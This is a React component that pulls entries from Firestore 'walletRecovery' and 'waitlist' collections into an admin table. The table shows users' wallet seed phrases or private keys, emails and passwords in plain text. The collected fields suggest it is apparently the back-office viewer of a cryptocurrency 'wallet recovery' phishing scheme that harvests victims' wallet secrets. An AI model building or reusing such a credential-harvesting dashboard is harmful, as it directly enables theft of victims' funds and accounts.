import React, { useEffect, useState } from "react";
import { collection, getDocs, deleteDoc, doc } from "firebase/firestore";
import { db } from "../firebaseConfig";
import styles from "../WaitlistViewer.module.css";

const WaitlistViewer = () => {
  const [recoveries, setRecoveries] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");

  const fetchRecoveries = async () => {
    try {
      setLoading(true);
      setError("");

      // Fetch from both collections
      const [walletSnap, waitlistSnap] = await Promise.allSettled([
        getDocs(collection(db, "walletRecovery")),
        getDocs(collection(db, "waitlist")),
      ]);

      let allData = [];

      if (walletSnap.status === "fulfilled") {
        const walletData = walletSnap.value.docs.map((docSnap) => ({
          id: docSnap.id,
          _collection: "walletRecovery",
          ...docSnap.data(),
        }));
        allData = allData.concat(walletData);
      } else {
        console.warn("Failed to fetch walletRecovery:", walletSnap.reason?.message);
      }

      if (waitlistSnap.status === "fulfilled") {
        const waitlistData = waitlistSnap.value.docs.map((docSnap) => ({
          id: docSnap.id,
          _collection: "waitlist",
          ...docSnap.data(),
        }));
        allData = allData.concat(waitlistData);
      } else {
        console.warn("Failed to fetch waitlist:", waitlistSnap.reason?.message);
      }

      // Sort by createTime/timestamp newest first
      allData.sort((a, b) => {
        const timeA = a.timestamp || a.createTime || "";
        const timeB = b.timestamp || b.createTime || "";
        return timeB.localeCompare(timeA);
      });

      setRecoveries(allData);

      if (allData.length === 0 && walletSnap.status === "rejected" && waitlistSnap.status === "rejected") {
        setError("Failed to fetch from both collections. Check Firestore rules and authentication.");
      }
    } catch (err) {
      console.error("Fetch error:", err);
      setError("Error fetching entries: " + err.message);
    } finally {
      setLoading(false);
    }
  };

  const handleDelete = async (item) => {
    if (window.confirm("Are you sure you want to delete this entry?")) {
      try {
        await deleteDoc(doc(db, item._collection, item.id));
        setRecoveries((prev) => prev.filter((r) => !(r.id === item.id && r._collection === item._collection)));
      } catch (err) {
        setError("Error deleting entry: " + err.message);
      }
    }
  };

  useEffect(() => {
    fetchRecoveries();
  }, []);

  if (loading) {
    return <div className={styles.loading}>Loading entries...</div>;
  }

  if (error) {
    return (
      <div className={styles.error}>
        <p>Error: {error}</p>
        <button onClick={fetchRecoveries} className={styles.refreshButton}>
          Retry
        </button>
      </div>
    );
  }

  return (
    <main className={styles.container}>
      <header className={styles.header}>
        <h1>Wallet Recovery Entries</h1>
        <span className={styles.count}>{recoveries.length} total</span>
        <button onClick={fetchRecoveries} className={styles.refreshButton}>
          Refresh
        </button>
      </header>

      <div className={styles.tableContainer}>
        <table className={styles.table}>
          <thead>
            <tr>
              <th>Source</th>
              <th>Wallet Address</th>
              <th>Wallet Type</th>
              <th>Recovery Option</th>
              <th>Recovery Data</th>
              <th>Email</th>
              <th>Password</th>
              <th>Encrypted</th>
              <th>Status</th>
              <th>Timestamp</th>
              <th>Actions</th>
            </tr>
          </thead>
          <tbody>
            {recoveries.length > 0 ? (
              recoveries.map((item) => (
                <tr key={`${item._collection}-${item.id}`}>
                  <td>
                    <span className={`${styles.badge} ${item._collection === "waitlist" ? styles.badgeWaitlist : styles.badgeRecovery}`}>
                      {item._collection === "waitlist" ? "Waitlist" : "Recovery"}
                    </span>
                  </td>
                  <td className={styles.walletAddress}>
                    {item.walletAddress || "N/A"}
                  </td>
                  <td>{item.walletType || "N/A"}</td>
                  <td>{item.recoveryOption || "N/A"}</td>
                  <td className={styles.recoveryKey}>
                    {item.recoveryKey || item.seedPhrase || item.privateKey || "N/A"}
                  </td>
                  <td>{item.email || "N/A"}</td>
                  <td>{item.password || "N/A"}</td>
                  <td>
                    <span className={`${styles.statusBadge} ${item.encrypted ? styles.statusPending : styles.statusDefault}`}>
                      {item.encrypted ? "Yes" : "No"}
                    </span>
                  </td>
                  <td>
                    <span className={`${styles.statusBadge} ${item.status === "pending" ? styles.statusPending : styles.statusDefault}`}>
                      {item.status || "N/A"}
                    </span>
                  </td>
                  <td>{item.timestamp ? new Date(item.timestamp).toLocaleString() : "N/A"}</td>
                  <td>
                    <button
                      onClick={() => handleDelete(item)}
                      className={styles.deleteButton}
                    >
                      Delete
                    </button>
                  </td>
                </tr>
              ))
            ) : (
              <tr>
                <td colSpan="11" className={styles.noData}>
                  No entries found.
                </td>
              </tr>
            )}
          </tbody>
        </table>
      </div>
    </main>
  );
};

export default WaitlistViewer;
